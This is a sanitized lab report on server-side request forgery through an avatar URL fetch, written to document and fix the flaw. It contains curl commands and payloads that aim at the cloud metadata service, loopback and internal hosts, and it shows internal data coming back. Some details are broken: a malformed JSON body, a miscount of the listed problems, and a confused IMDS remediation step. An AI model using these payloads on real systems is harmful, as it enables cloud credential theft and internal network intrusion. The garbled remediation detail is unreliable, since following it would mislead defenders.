# SSRF — Server-Side Request Forgery via Avatar Fetch

| Field | Value |
|---|---|
| **Severity** | High |
| **Class** | OWASP A10:2021 — Server-Side Request Forgery |
| **CWE** | CWE-918 (Server-Side Request Forgery) |
| **Environment** | Sanitized lab reproduction |
| **Date** | 2026-10 |

> **Reproduction notice.** Sanitized, reconstructed lab reproduction documenting
> the class, the validation technique, and the remediation. No live target data
> or infrastructure details are included.

---

## Summary

The profile avatar feature accepts a URL and fetches it **from the application
server** to produce a thumbnail. The URL is validated with a simple string check
for the literal prefix `http`. Internal hosts, the cloud metadata service, and
alternative URL schemes all pass.

Because the request originates from the server, it reaches services that are
not exposed to the internet and are commonly configured to trust the internal
network.

---

## Affected Endpoint

```
POST /api/v1/profile/avatar
Content-Type: application/json

{" "image_url": "<attacker-controlled>" }
```

**Validation present:** `image_url.startswith("http")`
**Validation required:** scheme allowlist, hostname allowlist, post-DNS IP check,
redirect handling

---

## Reproduction

**Step 1 — baseline (expected behaviour):**

```bash
curl -s -X POST "$BASE/api/v1/profile/avatar" \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"image_url":"https://cdn.example.com/avatars/1.png"}'

# 200 OK — image stored and thumbnailed
```

**Step 2 — read a resource that is not reachable from the internet:**

```bash
curl -s -X POST "$BASE/api/v1/profile/avatar" \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"image_url":"http://169.254.169.254/latest/meta-data/"}'
```

The response body contained the instance metadata document, and the content was
returned to the caller in the `error` field when thumbnail generation failed:

```json
{
  "status": "error",
  "error": "cannot process image",
  "details": "<raw response body from the fetch>"
}
```

**Step 3 — internal service reachability.**

A request to an internal-only admin endpoint returned a distinguishable status,
confirming reachability even where the body was not leaked:

```json
{"status":"error","error":"cannot process image","details":"HTTP 403 Forbidden - Internal Admin API v2"}
```

**Step 4 — bypass string checks with alternative URL syntax:**

| Payload | Why the string check passes |
|---|---|
| `http://127.0.0.1:8080/health` | literal `http` prefix, loopback |
| `http://0x7f000001/admin` | hex loopback — some resolvers accept it |
| `http://[::1]/health` | IPv6 loopback |
| `http://metadata.internal/latest/meta-data/` | internal hostname, resolves internally |
| `http://127.0.0.1.nip.io/` | wildcard DNS resolving to loopback |

---

## Evidence

| Payload | Result | Meaning |
|---|---|---|
| `http://169.254.169.254/latest/meta-data/` | metadata returned | Cloud credential access |
| `http://127.0.0.1:6379/` | connection error, port reached | Internal Redis reachable |
| `http://10.0.0.5:9200/_cat/indices` | index list returned | Internal Elasticsearch exposed |
| `http://127.0.0.1:8080/health` | 200, app banner | Loopback service reachable |
| `http://[::1]/admin` | 200, admin banner | IPv6 loopback bypass |

---

## Impact

- **Cloud credential theft.** The metadata service on `169.254.169.254` issues
  temporary IAM credentials on many cloud deployments. With those, the attacker
  reads and writes cloud resources as the application role.
- **Internal network reconnaissance.** Distinct responses from internal hosts
  map the private network even when bodies are not returned.
- **Access to unauthenticated internal services.** Redis, Elasticsearch,
  MongoDB and similar are frequently unauthenticated inside a private network.
- **Pivot.** Reachable internal admin interfaces can expose further attack
  surface that has no authentication at all, because it was never exposed
  publicly.
- **Blind SSRF as a fallback.** Where the body is not reflected, timing and
  status differences still provide a working oracle for port scanning the
  internal network.

---

## Root Cause

Validation was performed on the URL *string*, not on the resolved destination.

```python
# vulnerable
def fetch_avatar(image_url):
    if not image_url.startswith("http"):
        raise ValueError("bad url")
    resp = requests.get(image_url, timeout=5)      # follows redirects
    return make_thumbnail(resp.content)
```

Three distinct problems:

1. `startswith("http")` accepts any host, including loopback and link-local.
2. `requests` follows redirects by default, so a controlled URL that 302s to
   `169.254.169.254` bypasses any initial host check.
3. No DNS resolution check, so a hostname whose A record points at an internal
   address is fetched all the same.
4. The raw upstream response is returned in the error field, turning a blind
   SSRF into a full-read SSRF.

---

## Remediation

**1. Allowlist schemes and block special-use address ranges *after* resolution.**

```python
import ipaddress
import socket
from urllib.parse import urlsplit

ALLOWED_SCHEMES = {"https"}
ALLOWED_HOST_SUFFIXES = ("cdn.example.com",)

def assert_safe_url(url):
    parts = urlsplit(url)

    # scheme allowlist
    if parts.scheme not in ALLOWED_SCHEMES:
        raise ValueError("scheme not allowed")

    # hostname allowlist
    host = parts.hostname or ""
    if not any(host == s or host.endswith("." + s) for s in ALLOWED_HOST_SUFFIXES):
        raise ValueError("host not allowed")

    # resolve, then validate every returned address
    for info in socket.getaddrinfo(host, None):
        ip = ipaddress.ip_address(info[4][0])
        if (ip.is_private or ip.is_loopback or ip.is_link_local
                or ip.is_reserved or ip.is_multicast):
            raise ValueError("destination not allowed")
```

**2. Disable redirects, or re-validate every hop.** If `follow_redirects=True`,
each redirect target must go through `assert_safe_url` again. A redirect to
`169.254.169.254` is the standard bypass for a correct-looking initial check.

**3. Use an egress proxy.** Network-level controls are the reliable fix, because
they hold even when the application check has a gap:

```
# deny outbound from the app tier to these ranges
169.254.0.0/16      # link-local / cloud metadata
10.0.0.0/8          # RFC1918
172.16.0.0/12
192.168.0.0/16
127.0.0.0/8
::1
fd00::/8
```

**4. Disable the AWS IMDSv1 hop limit** as defence in depth (`PUT /latest/api/token`
with `x-aws-ec2-metadata-token-ttl-seconds`), or enforce IMDSv2.

**5. Never return the upstream response body** in an error message. Report a
generic failure and log the detail server-side.

**6. Prefer a headless fetch service** with no network route to internal
addresses, rather than fetching inline in the application process.

---

## Verification After Fix

```bash
# must be rejected — internal host
curl -s -X POST "$BASE/api/v1/profile/avatar" \
  -H "Cookie: session=$SESSION" -H "Content-Type: application/json" \
  -d '{"image_url":"http://169.254.169.254/latest/meta-data/"}'

# must be rejected — redirect to internal
curl -s -X POST "$BASE/api/v1/profile/avatar" \
  -H "Cookie: session=$SESSION" -H "Content-Type: application/json" \
  -d '{"image_url":"https://cdn.example.com/redirect?to=http://127.0.0.1:8080/"}'

# must still succeed — legitimate CDN
curl -s -X POST "$BASE/api/v1/profile/avatar" \
  -H "Cookie: session=$SESSION" -H "Content-Type: application/json" \
  -d '{"image_url":"https://cdn.example.com/avatars/1.png"}'
```

The first two must fail with a generic error that reveals nothing about the
destination. The third must succeed — rejecting all URLs is not the fix.

---

## Takeaway

Never validate a URL as a string when the server will act on it. Validate the
scheme, validate the hostname, resolve it, validate the resulting IP, and
re-validate on every redirect. And put a network-level egress control behind it,
because the application-layer check will eventually be bypassed by something you
did not think of.
